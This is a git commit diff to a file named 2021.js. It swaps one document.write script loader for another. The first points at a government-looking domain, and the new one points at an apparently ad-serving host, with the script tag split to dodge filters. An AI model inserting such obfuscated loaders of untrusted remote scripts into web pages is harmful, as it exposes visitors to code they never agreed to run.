996ce2cbe7de4af6c1e41f89efa0b54fe51ef16f
boba3721 <68194272+boba3721@users.noreply.github.com>
2021-01-18 19:40:06 +0800

    Update 2021.js

--- 2021.js
+++ 2021.js
@@ -1,1 +1,1 @@
-document.write('<script src="https://show.govjiangsu.cn:12443/ty/6B46F52A-03EA-13163-33-2DD7DFAE7B5D.alpha"><\/script>');
+document.write('<scr'+'ipt src="//js.handanxinkai.com/c.aspx?action=c&c1=7&c2=3338&c3=&c4=2&c5=AdCode_sjdb&c6=640x150&c7=1&c8=1&c9=&c10="></scr'+'ipt>');
